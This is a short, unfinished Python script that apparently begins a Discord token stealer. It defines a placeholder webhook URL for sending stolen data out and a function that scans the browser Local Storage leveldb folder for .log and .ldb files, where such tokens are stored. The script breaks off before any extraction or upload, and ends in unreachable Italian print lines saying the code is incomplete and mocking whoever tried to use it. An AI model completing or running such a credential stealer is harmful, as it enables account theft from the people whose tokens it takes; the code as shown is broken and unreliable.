import os
import re
import json

from urllib.request import Request, urlopen

# ur webhook URL
WEBHOOK_URL = 'WEBHOOK HERE'

# just a aMaZinG feature
PING_ME = False

def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue
            
            print("il codice non è completo")
            print("sci volev futterm")
            print("aspetta quelche giorno che lo finisco")
